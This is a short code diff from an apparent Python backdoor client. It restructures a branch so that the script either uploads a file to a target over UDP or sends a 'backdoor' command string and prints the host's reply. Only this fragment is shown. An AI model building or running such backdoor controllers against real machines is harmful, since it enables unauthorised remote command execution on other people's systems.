@@ -105,6 +105,6 @@ if __name__ == "__main__":
             sk.close()
             sk = get_udp_socket()
             upload_file(local_path, remote_path, sk, target)
-
-        sk.sendto(f"backdoor {cmd}\0".encode(), target)
-        print(f"{recv_msg(sk)}")
+        else:
+            sk.sendto(f"backdoor {cmd}\0".encode(), target)
+            print(f"{recv_msg(sk)}")
